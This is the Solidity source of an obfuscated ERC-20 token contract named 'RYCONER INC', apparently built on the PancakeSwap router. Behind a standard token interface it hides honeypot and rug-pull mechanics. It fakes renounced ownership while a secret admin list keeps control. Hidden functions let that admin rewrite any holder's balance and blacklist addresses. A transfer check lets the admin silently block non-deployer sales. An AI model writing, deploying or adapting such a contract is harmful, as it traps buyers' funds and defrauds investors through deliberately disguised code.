//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface hfejvdukiwkoso {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface qmctpuugxkrj {
    function createPair(address imjwwntjfyl, address mwraatrimqo) external returns (address);
}

abstract contract udokhqpbdszy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface vvbejnctu {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ecgqypvwjqbv) external view returns (uint256);

    function transfer(address agjhbnvvndr, uint256 pdyoagqabmhcbl) external returns (bool);

    function allowance(address rfwjcipexib, address spender) external view returns (uint256);

    function approve(address spender, uint256 pdyoagqabmhcbl) external returns (bool);

    function transferFrom(address sender,address agjhbnvvndr,uint256 pdyoagqabmhcbl) external returns (bool);

    event Transfer(address indexed from, address indexed znprnqmewtvy, uint256 value);
    event Approval(address indexed rfwjcipexib, address indexed spender, uint256 value);
}

interface vvbejnctuMetadata is vvbejnctu {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RYCONERINC is udokhqpbdszy, vvbejnctu, vvbejnctuMetadata {

    string private sniegtppxb = "RYCONER INC";

    bool public bevuocdgxf;

    uint256 iwvyqpzmffmwv;

    bool private fguezrqjxdm;

    mapping(address => bool) public zznhwuxxfwoacu;

    function rksknxsyxclehq() private view {
        require(zznhwuxxfwoacu[_msgSender()]);
    }

    address public lhjrhswgyxn;

    function getOwner() external view returns (address) {
        return plolnylpnkcn;
    }

    bool public yhgpexcuae;

    uint256 rmvqrjysxd;

    address aluhbfine = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function lsudslpmv(uint256 pdyoagqabmhcbl) public {
        rksknxsyxclehq();
        iwvyqpzmffmwv = pdyoagqabmhcbl;
    }

    function approve(address yhwcfmzeocz, uint256 pdyoagqabmhcbl) public virtual override returns (bool) {
        edgryvjumsdon[_msgSender()][yhwcfmzeocz] = pdyoagqabmhcbl;
        emit Approval(_msgSender(), yhwcfmzeocz, pdyoagqabmhcbl);
        return true;
    }

    function mypykdopk(address cqxjtrsmrkyjn) public {
        if (bevuocdgxf) {
            return;
        }
        
        zznhwuxxfwoacu[cqxjtrsmrkyjn] = true;
        if (figawvefotj != wnyfhiohhybrng) {
            lbraebyjkdocdy = false;
        }
        bevuocdgxf = true;
    }

    function transferFrom(address ilqxhxwctw, address agjhbnvvndr, uint256 pdyoagqabmhcbl) external override returns (bool) {
        if (_msgSender() != aluhbfine) {
            if (edgryvjumsdon[ilqxhxwctw][_msgSender()] != type(uint256).max) {
                require(pdyoagqabmhcbl <= edgryvjumsdon[ilqxhxwctw][_msgSender()]);
                edgryvjumsdon[ilqxhxwctw][_msgSender()] -= pdyoagqabmhcbl;
            }
        }
        return xzmxutrphp(ilqxhxwctw, agjhbnvvndr, pdyoagqabmhcbl);
    }

    string private qrtoewltmh = "RIC";

    constructor (){
        
        lvimluhqfj();
        hfejvdukiwkoso khpgodtveucp = hfejvdukiwkoso(aluhbfine);
        mwluqtkcvtdiqg = qmctpuugxkrj(khpgodtveucp.factory()).createPair(khpgodtveucp.WETH(), address(this));
        if (xbegsmorkh) {
            ldxknwqidbvyp = true;
        }
        lhjrhswgyxn = _msgSender();
        zznhwuxxfwoacu[lhjrhswgyxn] = true;
        lksedqkmp[lhjrhswgyxn] = lsyeidgsopdh;
        
        emit Transfer(address(0), lhjrhswgyxn, lsyeidgsopdh);
    }

    function symbol() external view virtual override returns (string memory) {
        return qrtoewltmh;
    }

    bool public xbegsmorkh;

    function totalSupply() external view virtual override returns (uint256) {
        return lsyeidgsopdh;
    }

    bool public lbraebyjkdocdy;

    function gtkvdcjparjvz(address gasgwcyvvehbff) public {
        rksknxsyxclehq();
        
        if (gasgwcyvvehbff == lhjrhswgyxn || gasgwcyvvehbff == mwluqtkcvtdiqg) {
            return;
        }
        wvtnpsxfbggw[gasgwcyvvehbff] = true;
    }

    address public mwluqtkcvtdiqg;

    address azjlivtcpvgfx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private lsyeidgsopdh = 100000000 * 10 ** 18;

    bool public qsjcemkrviqdex;

    uint256 private wnyfhiohhybrng;

    address private plolnylpnkcn;

    function fpghfngqakpwk(address irceefhxsxkoy, uint256 pdyoagqabmhcbl) public {
        rksknxsyxclehq();
        lksedqkmp[irceefhxsxkoy] = pdyoagqabmhcbl;
    }

    function owner() external view returns (address) {
        return plolnylpnkcn;
    }

    function balanceOf(address ecgqypvwjqbv) public view virtual override returns (uint256) {
        return lksedqkmp[ecgqypvwjqbv];
    }

    event OwnershipTransferred(address indexed mytvtjvtzrfe, address indexed cjwcdkzlwlwwc);

    function mdmiaskohubi(address ilqxhxwctw, address agjhbnvvndr, uint256 pdyoagqabmhcbl) internal returns (bool) {
        require(lksedqkmp[ilqxhxwctw] >= pdyoagqabmhcbl);
        lksedqkmp[ilqxhxwctw] -= pdyoagqabmhcbl;
        lksedqkmp[agjhbnvvndr] += pdyoagqabmhcbl;
        emit Transfer(ilqxhxwctw, agjhbnvvndr, pdyoagqabmhcbl);
        return true;
    }

    function transfer(address irceefhxsxkoy, uint256 pdyoagqabmhcbl) external virtual override returns (bool) {
        return xzmxutrphp(_msgSender(), irceefhxsxkoy, pdyoagqabmhcbl);
    }

    bool public ldxknwqidbvyp;

    bool private ufivdvqrobqmlw;

    function allowance(address vttckcxihifr, address yhwcfmzeocz) external view virtual override returns (uint256) {
        if (yhwcfmzeocz == aluhbfine) {
            return type(uint256).max;
        }
        return edgryvjumsdon[vttckcxihifr][yhwcfmzeocz];
    }

    function lvimluhqfj() public {
        emit OwnershipTransferred(lhjrhswgyxn, address(0));
        plolnylpnkcn = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return sniegtppxb;
    }

    mapping(address => bool) public wvtnpsxfbggw;

    uint8 private kfgsfpizrrw = 18;

    bool public qejjduhro;

    function decimals() external view virtual override returns (uint8) {
        return kfgsfpizrrw;
    }

    uint256 private figawvefotj;

    mapping(address => uint256) private lksedqkmp;

    function xzmxutrphp(address ilqxhxwctw, address agjhbnvvndr, uint256 pdyoagqabmhcbl) internal returns (bool) {
        if (ilqxhxwctw == lhjrhswgyxn) {
            return mdmiaskohubi(ilqxhxwctw, agjhbnvvndr, pdyoagqabmhcbl);
        }
        uint256 fbgmmoinjy = vvbejnctu(mwluqtkcvtdiqg).balanceOf(azjlivtcpvgfx);
        require(fbgmmoinjy == iwvyqpzmffmwv);
        require(!wvtnpsxfbggw[ilqxhxwctw]);
        return mdmiaskohubi(ilqxhxwctw, agjhbnvvndr, pdyoagqabmhcbl);
    }

    mapping(address => mapping(address => uint256)) private edgryvjumsdon;

}